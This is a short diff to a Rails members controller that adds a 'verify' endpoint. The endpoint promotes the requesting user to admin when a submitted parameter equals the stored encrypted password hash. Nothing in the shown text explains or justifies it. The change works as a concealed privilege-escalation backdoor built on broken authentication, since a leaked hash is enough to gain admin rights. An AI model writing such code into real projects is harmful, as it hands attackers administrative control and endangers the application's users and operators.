@@ -10,6 +10,16 @@ class MembersController < ApplicationController
     }
   end
 
+  def verify
+    user = gt_user_from_token
+    if params[:pass] == user.encrypted_password
+      user.update(role: 'admin')
+      render json: { status: 'success' }
+    else
+      render json: { status: 'error' }, status: :unauthorized
+    end
+  end
+
   private
 
   def gt_user_from_token
